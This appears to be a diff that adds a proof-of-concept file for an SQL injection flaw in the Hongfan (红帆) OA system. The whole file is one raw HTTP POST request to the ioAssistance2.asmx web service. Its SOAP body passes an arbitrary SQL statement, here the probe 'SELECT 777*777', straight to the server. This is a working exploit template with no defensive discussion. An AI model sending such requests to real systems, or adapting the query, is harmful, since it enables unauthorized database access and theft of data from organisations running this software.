@@ -1,0 +1,18 @@
+# 红帆oa ioassistance2.asmx sql注入漏洞
+POST /ioffice/prg/set/wss/ioAssistance2.asmx HTTP/1.1
+Host: www.byp-test.com:8080
+Accept-Language: zh-CN
+Timeoffset: -28800000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0
+Accept: application/json, text/plain, */*
+Accept-Encoding: gzip, deflate
+Content-Type: application/xml
+Content-Length: 371
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001\r\n/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+ <soap:Body><GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
+<sql>SELECT 777*777</sql>
+ </GetLoginedEmpNoReadedInf>
+ </soap:Body>
+</soap:Envelope>
